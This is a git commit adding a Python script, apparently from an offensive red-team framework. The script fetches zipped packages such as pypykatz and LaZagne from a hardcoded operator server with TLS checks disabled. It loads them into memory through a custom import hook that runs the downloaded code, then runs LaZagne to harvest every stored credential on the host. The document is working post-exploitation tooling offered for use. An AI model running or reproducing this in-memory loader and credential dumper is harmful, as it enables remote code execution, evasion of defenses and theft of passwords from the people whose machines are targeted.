8fa029c40795da1903cd801c65f74072200aa943
Sam Free5ide <snovvcrash@protonmail.ch>
2022-09-21 20:24:49 +0300

    Add LaZagne base example

---
+++ Server/base-LaZagne.py
@@ -0,0 +1,445 @@
+'''
+Author: @naksyn (c) 2022
+-
+Copyright 2022 naksyn
+Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"),
+to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense,
+and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
+The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, 
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, 
+DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE 
+OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
+
+This script also contains an adaptation of https://github.com/login-securite/DonPAPI/blob/main/DonPAPI.py
+'''
+
+import os
+import base64
+import ssl
+import importlib
+import zipfile
+import urllib.request
+import sys
+import io
+import time
+import logging
+import ctypes
+import inspect #to test modules
+
+###### CHANGE THIS ##########
+pyramid_server = '10.147.20.187'
+pyramid_port = '443'
+pyramid_user = 'testuser'
+pyramid_pass = 'Sup3rP4ss!'
+lazagne_module = 'all'
+lazagne_verbosity = ''  # '' / '-v' / '-vv'
+#############################
+
+cwd = os.getcwd()
+
+fileName = 'Cryptodome.zip'
+print("[*] Downloading and unpacking Cryptodome: " + fileName)
+
+gcontext = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+gcontext.check_hostname = False
+gcontext.verify_mode = ssl.CERT_NONE
+request = urllib.request.Request('https://'+ pyramid_server + ':' + pyramid_port + '/' + fileName)
+base64string = base64.b64encode(bytes('%s:%s' % (pyramid_user, pyramid_pass),'ascii'))
+request.add_header("Authorization", "Basic %s" % base64string.decode('utf-8'))
+with urllib.request.urlopen(request, context=gcontext) as response:
+   zip_web = response.read()
+   
+with zipfile.ZipFile(io.BytesIO(zip_web), 'r') as zip_ref:
+	zip_ref.extractall(cwd)
+
+
+#### MODULE IMPORTER ####
+
+moduleRepo = {}
+_meta_cache = {}
+
+# [0] = .py ext, is_package = False
+# [1] = /__init__.py ext, is_package = True
+_search_order = [('.py', False), ('/__init__.py', True)]
+
+
+class ZipImportError(ImportError):
+	"""Exception raised by zipimporter objects."""
+
+# _get_info() = takes the fullname, then subpackage name (if applicable),
+# and searches for the respective module or package
+
+
+class CFinder(object):
+	"""Import Hook"""
+	def __init__(self, repoName):
+		self.repoName = repoName
+		self._source_cache = {}
+
+	def _get_info(self, repoName, fullname):
+		"""Search for the respective package or module in the zipfile object"""
+		parts = fullname.split('.')
+		submodule = parts[-1]
+		modulepath = '/'.join(parts)
+
+		#check to see if that specific module exists
+
+		for suffix, is_package in _search_order:
+			relpath = modulepath + suffix
+			try:
+				moduleRepo[repoName].getinfo(relpath)
+			except KeyError:
+				pass
+			else:
+				return submodule, is_package, relpath
+
+		#Error out if we can find the module/package
+		msg = ('Unable to locate module %s in the %s repo' % (submodule, repoName))
+		raise ZipImportError(msg)
+
+	def _get_source(self, repoName, fullname):
+		"""Get the source code for the requested module"""
+		submodule, is_package, relpath = self._get_info(repoName, fullname)
+		fullpath = '%s/%s' % (repoName, relpath)
+		if relpath in self._source_cache:
+			source = self._source_cache[relpath]
+			return submodule, is_package, fullpath, source
+		try:
+			### added .decode
+			source =  moduleRepo[repoName].read(relpath).decode()
+			#print(source)
+			source = source.replace('\r\n', '\n')
+			source = source.replace('\r', '\n')
+			self._source_cache[relpath] = source
+			return submodule, is_package, fullpath, source
+		except:
+			raise ZipImportError("Unable to obtain source for module %s" % (fullpath))
+
+	def find_module(self, fullname, path=None):
+
+		try:
+			submodule, is_package, relpath = self._get_info(self.repoName, fullname)
+		except ImportError:
+			return None
+		else:
+			return self
+
+	def load_module(self, fullname):
+		submodule, is_package, fullpath, source = self._get_source(self.repoName, fullname)
+		code = compile(source, fullpath, 'exec')
+		spec = importlib.util.spec_from_loader(fullname, loader=None)
+		mod = sys.modules.setdefault(fullname, importlib.util.module_from_spec(spec))
+		mod.__loader__ = self
+		mod.__file__ = fullpath
+		mod.__name__ = fullname
+		if is_package:
+			mod.__path__ = [os.path.dirname(mod.__file__)]
+		exec(code,mod.__dict__)
+		return mod
+
+	def get_data(self, fullpath):
+
+		prefix = os.path.join(self.repoName, '')
+		if not fullpath.startswith(prefix):
+			raise IOError('Path %r does not start with module name %r', (fullpath, prefix))
+		relpath = fullpath[len(prefix):]
+		try:
+			return moduleRepo[self.repoName].read(relpath)
+		except KeyError:
+			raise IOError('Path %r not found in repo %r' % (relpath, self.repoName))
+
+	def is_package(self, fullname):
+		"""Return if the module is a package"""
+		submodule, is_package, relpath = self._get_info(self.repoName, fullname)
+		return is_package
+
+	def get_code(self, fullname):
+		submodule, is_package, fullpath, source = self._get_source(self.repoName, fullname)
+		return compile(source, fullpath, 'exec')
+
+def install_hook(repoName):
+	if repoName not in _meta_cache:
+		finder = CFinder(repoName)
+		_meta_cache[repoName] = finder
+		sys.meta_path.append(finder)
+
+def remove_hook(repoName):
+	if repoName in _meta_cache:
+		finder = _meta_cache.pop(repoName)
+		sys.meta_path.remove(finder)
+
+def hook_routine(fileName,zip_web):
+	#print(zip_web)
+	zf=zipfile.ZipFile(io.BytesIO(zip_web), 'r')
+	#print(zf)
+	moduleRepo[fileName]=zf
+	install_hook(fileName)
+
+
+zip_list = [
+	'future',
+	'pyasn1',
+	'rsa',
+	'asn1crypto',
+	'unicrypto',
+	'minidump',
+	'minikerberos',
+	'pypykatz',
+	'lazagne'
+]
+
+for zip_name in zip_list:
+	try:
+		print("[*] Loading in memory module package: " + zip_name)
+		gcontext = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+		gcontext.check_hostname = False
+		gcontext.verify_mode = ssl.CERT_NONE
+		request = urllib.request.Request('https://'+ pyramid_server + ':' + pyramid_port + '/' + zip_name + '.zip')
+		base64string = base64.b64encode(bytes('%s:%s' % (pyramid_user, pyramid_pass),'ascii'))
+		request.add_header("Authorization", "Basic %s" % base64string.decode('utf-8'))
+		with urllib.request.urlopen(request, context=gcontext) as response:
+			zip_web = response.read()
+			hook_routine(zip_name, zip_web)
+	except Exception as e:
+		print(e)
+
+print("[*] Modules imported")
+
+
+# -*- coding: utf-8 -*- 
+# !/usr/bin/python
+
+##############################################################################
+#                                                                            #
+#                           By Alessandro ZANNI                              #
+#                                                                            #
+##############################################################################
+
+# Disclaimer: Do Not Use this program for illegal purposes ;)
+
+import argparse
+import logging
+import sys
+import time
+import os
+
+from lazagne.config.write_output import write_in_file, StandardOutput
+from lazagne.config.manage_modules import get_categories
+from lazagne.config.constant import constant
+from lazagne.config.run import run_lazagne, create_module_dic
+
+constant.st = StandardOutput()  # Object used to manage the output / write functions (cf write_output file)
+modules = create_module_dic()
+
+
+def output(output_dir=None, txt_format=False, json_format=False, all_format=False):
+    if output_dir:
+        if os.path.isdir(output_dir):
+            constant.folder_name = output_dir
+        else:
+            print('[!] Specify a directory, not a file !')
+
+    if txt_format:
+        constant.output = 'txt'
+
+    if json_format:
+        constant.output = 'json'
+
+    if all_format:
+        constant.output = 'all'
+
+    if constant.output:
+        if not os.path.exists(constant.folder_name):
+            os.makedirs(constant.folder_name)
+            # constant.file_name_results = 'credentials' # let the choice of the name to the user
+
+        if constant.output != 'json':
+            constant.st.write_header()
+
+
+def quiet_mode(is_quiet_mode=False):
+    if is_quiet_mode:
+        constant.quiet_mode = True
+
+
+def verbosity(verbose=0):
+    # Write on the console + debug file
+    if verbose == 0:
+        level = logging.CRITICAL
+    elif verbose == 1:
+        level = logging.INFO
+    elif verbose >= 2:
+        level = logging.DEBUG
+
+    formatter = logging.Formatter(fmt='%(message)s')
+    stream = logging.StreamHandler(sys.stdout)
+    stream.setFormatter(formatter)
+    root = logging.getLogger()
+    root.setLevel(level)
+    # If other logging are set
+    for r in root.handlers:
+        r.setLevel(logging.CRITICAL)
+    root.addHandler(stream)
+
+
+def manage_advanced_options(user_password=None):
+    if user_password:
+        constant.user_password = user_password
+
+
+def runLaZagne(category_selected='all', subcategories={}, password=None):
+    """
+    This function will be removed, still there for compatibility with other tools
+    Everything is on the config/run.py file
+    """
+    for pwd_dic in run_lazagne(category_selected=category_selected, subcategories=subcategories, password=password):
+        yield pwd_dic
+
+
+def clean_args(arg):
+    """
+    Remove not necessary values to get only subcategories
+    """
+    for i in ['output', 'write_normal', 'write_json', 'write_all', 'verbose', 'auditType', 'quiet']:
+        try:
+            del arg[i]
+        except Exception:
+            pass
+    return arg
+
+
+if __name__ == '__main__':
+
+    parser = argparse.ArgumentParser(description=constant.st.banner, formatter_class=argparse.RawTextHelpFormatter)
+    parser.add_argument('-version', action='version', version='Version ' + str(constant.CURRENT_VERSION),
+                        help='laZagne version')
+
+    # ------------------------------------------- Permanent options -------------------------------------------
+    # Version and verbosity
+    PPoptional = argparse.ArgumentParser(
+        add_help=False,
+        formatter_class=lambda prog: argparse.HelpFormatter(prog,
+                                                            max_help_position=constant.max_help)
+    )
+    PPoptional._optionals.title = 'optional arguments'
+    PPoptional.add_argument('-v', dest='verbose', action='count', default=0, help='increase verbosity level')
+    PPoptional.add_argument('-quiet', dest='quiet', action='store_true', default=False,
+                            help='quiet mode: nothing is printed to the output')
+
+    # Output
+    PWrite = argparse.ArgumentParser(
+        add_help=False,
+        formatter_class=lambda prog: argparse.HelpFormatter(prog,
+                                                            max_help_position=constant.max_help)
+    )
+    PWrite._optionals.title = 'Output'
+    PWrite.add_argument('-oN', dest='write_normal', action='store_true', default=None,
+                        help='output file in a readable format')
+    PWrite.add_argument('-oJ', dest='write_json', action='store_true', default=None,
+                        help='output file in a json format')
+    PWrite.add_argument('-oA', dest='write_all', action='store_true', default=None, help='output file in both format')
+    PWrite.add_argument('-output', dest='output', action='store', default='.',
+                        help='destination path to store results (default:.)')
+
+    # Windows user password
+    PPwd = argparse.ArgumentParser(
+        add_help=False,
+        formatter_class=lambda prog: argparse.HelpFormatter(
+            prog,
+            max_help_position=constant.max_help)
+    )
+    PPwd._optionals.title = 'Windows User Password'
+    PPwd.add_argument('-password', dest='password', action='store',
+                      help='Windows user password (used to decrypt creds files)')
+
+    # -------------------------- Add options and suboptions to all modules --------------------------
+    all_subparser = []
+    all_categories = get_categories()
+    for c in all_categories:
+        all_categories[c]['parser'] = argparse.ArgumentParser(
+            add_help=False,
+            formatter_class=lambda prog: argparse.HelpFormatter(prog,
+                                                                max_help_position=constant.max_help)
+        )
+        all_categories[c]['parser']._optionals.title = all_categories[c]['help']
+
+        # Manage options
+        all_categories[c]['subparser'] = []
+        for module in modules[c]:
+            m = modules[c][module]
+            all_categories[c]['parser'].add_argument(m.options['command'], action=m.options['action'],
+                                                 dest=m.options['dest'], help=m.options['help'])
+
+            # Manage all suboptions by modules
+            if m.suboptions and m.name != 'thunderbird':
+                tmp = []
+                for sub in m.suboptions:
+                    tmp_subparser = argparse.ArgumentParser(
+                        add_help=False,
+                        formatter_class=lambda prog: argparse.HelpFormatter(
+                            prog,
+                            max_help_position=constant.max_help)
+                    )
+                    tmp_subparser._optionals.title = sub['title']
+                    if 'type' in sub:
+                        tmp_subparser.add_argument(sub['command'], type=sub['type'], action=sub['action'],
+                                                   dest=sub['dest'], help=sub['help'])
+                    else:
+                        tmp_subparser.add_argument(sub['command'], action=sub['action'], dest=sub['dest'],
+                                                   help=sub['help'])
+                    tmp.append(tmp_subparser)
+                    all_subparser.append(tmp_subparser)
+                    all_categories[c]['subparser'] += tmp
+
+    # ------------------------------------------- Print all -------------------------------------------
+
+    parents = [PPoptional] + all_subparser + [PPwd, PWrite]
+    dic = {'all': {'parents': parents, 'help': 'Run all modules'}}
+    for c in all_categories:
+        parser_tab = [PPoptional, all_categories[c]['parser']]
+        if 'subparser' in all_categories[c]:
+            if all_categories[c]['subparser']:
+                parser_tab += all_categories[c]['subparser']
+        parser_tab += [PPwd, PWrite]
+        dic_tmp = {c: {'parents': parser_tab, 'help': 'Run %s module' % c}}
+        # Concatenate 2 dic
+        dic = dict(dic, **dic_tmp)
+
+    # Main commands
+    subparsers = parser.add_subparsers(help='Choose a main command')
+    for d in dic:
+        subparsers.add_parser(d, parents=dic[d]['parents'], help=dic[d]['help']).set_defaults(auditType=d)
+
+    # ------------------------------------------- Parse arguments -------------------------------------------
+
+    args = [lazagne_module]
+    if lazagne_verbosity:
+    	args += lazagne_verbosity
+    args = dict(parser.parse_args(args)._get_kwargs())
+    arguments = parser.parse_args()
+
+    # Define constant variables
+    output(
+        output_dir=args['output'],
+        txt_format=args['write_normal'],
+        json_format=args['write_json'],
+        all_format=args['write_all']
+    )
+    verbosity(verbose=args['verbose'])
+    manage_advanced_options(user_password=args.get('password', None))
+    quiet_mode(is_quiet_mode=args['quiet'])
+
+    # Print the title
+    constant.st.first_title()
+
+    start_time = time.time()
+
+    category = args['auditType']
+    subcategories = clean_args(args)
+
+    for r in runLaZagne(category_selected=category, subcategories=subcategories, password=args.get('password', None)):
+        pass
+
+    write_in_file(constant.stdout_result)
+    constant.st.print_footer(elapsed_time=str(time.time() - start_time))
